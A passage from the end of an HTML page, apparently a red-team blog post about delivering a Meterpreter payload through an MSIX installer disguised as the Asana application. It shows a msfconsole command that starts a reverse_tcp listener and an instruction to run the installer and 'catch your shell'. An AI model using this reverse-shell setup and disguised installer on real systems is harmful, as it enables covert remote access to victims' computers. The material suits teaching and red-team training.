444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg></span></span><span class=dark:text-neutral-300>Ensure that the Asana application is not installed in the system</span></div><img src=/posts/2024-06-11_red_team06/images/asanainstaller2.png><ul><li>Setup our listener</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfconsole -qx <span class=s2>&#34;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.71;set LPORT 9001; set EXITFUNC thread; set EXITONSESSION false; exploit -j&#34;</span> 2&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span></code></pre></div><img src=/posts/2024-06-11_red_team06/images/listener.png><ul><li>Run the MSIX installation and catch your shell</li></ul><img src=/posts/2024-06-11_red_team06/images/session1.png><ul><li>Happy hacking!</li></ul></div></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group" href=/posts/2023-09-24_red_team05/><span class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Malware development: Building malware with 0 imports</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2023-09-24 00:00:00 +0000 UTC">24 September 2023</time></span></span></a></span>
<span></span></div></div></footer></article><div class="absolute top-[110vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"><a href=#the-top class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><div id=search-wrapper class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible" data-url=https://trevorsaudi.com/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div><footer class="py-10 print:hidden"><div class="flex justify-between"><div><p class="text-sm text-neutral-500 dark:text-neutral-400">😄</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://git.io/hugo-congo target=_blank rel="noopener noreferrer">Congo</a></p></div><div class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"><button id=appearance-switcher class="w-12 h-12" type=button title="Switch to dark appearance">
<span class="inline dark:hidden"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></span><span class="hidden dark:inline"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></span></button></div></div></footer></div></body></html>